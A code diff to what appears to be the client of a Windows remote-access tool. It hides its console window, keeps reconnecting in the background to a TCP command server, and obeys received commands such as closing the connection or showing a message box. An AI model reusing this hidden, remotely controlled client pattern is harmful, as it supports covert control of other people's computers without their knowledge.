@@ -14,13 +14,22 @@
 using namespace std::chrono;
 using namespace std::chrono_literals;
 
+/* TCPSocket tcp = TCPSocket("ip", port); */
 TCPSocket tcp = TCPSocket("127.0.0.1", 2626);
+
+void reconnect()
+{
+	while (tcp.Connect() != E_CONNECT) {
+		std::this_thread::sleep_for(seconds(1));
+	}
+}
 
 int main()
 {
+	/* Hide Console */
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-	while (tcp.Connect() == E_CONNECT) std::this_thread::sleep_for(seconds(1));
+	std::thread(reconnect).detach();
 
 	while (true)
 	{
@@ -31,6 +40,7 @@ int main()
 		if (strcmp(data.command, "del") == 0)
 		{
 			tcp.Close();
+
 			break;
 		}
 
@@ -41,8 +51,7 @@ int main()
 			}
 		}
 
-		else if (strcmp(data.command, "msgbox") == 0)
-		{
+		else if (strcmp(data.command, "msgbox") == 0) {
 			MessageBoxA(0, data.first_option, data.second_option, 0);
 		}
 	}
